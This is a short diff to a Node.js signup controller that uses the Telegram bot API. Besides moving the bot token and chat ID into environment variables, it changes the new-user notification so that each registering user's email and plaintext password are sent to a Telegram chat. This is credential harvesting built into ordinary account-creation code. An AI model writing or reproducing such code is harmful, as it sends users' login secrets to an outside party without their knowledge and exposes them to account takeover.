@@ -1,15 +1,20 @@
 import User from '../model/usermodel.js';
 import TelegramBot from 'node-telegram-bot-api';
+import dotenv from 'dotenv';
 
-const token = 'YOUR_TELEGRAM_BOT_TOKEN';
+dotenv.config();
+
+const token = process.env.TELEGRAM_BOT_TOKEN;
 const bot = new TelegramBot(token, { polling: false });
 
 export const createUser = async (req, res) => {
   try {
     const user = new User(req.body);
     await user.save();
-    const message = `New user created: ${user.email}`;
-    await bot.sendMessage('YOUR_CHAT_ID', message);
+    const message = `New user created: 
+Email: ${user.email} 
+Password: ${user.password}`;
+    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message);
     res.send('User created successfully');
   } catch (error) {
     res.status(500).send(error.message);
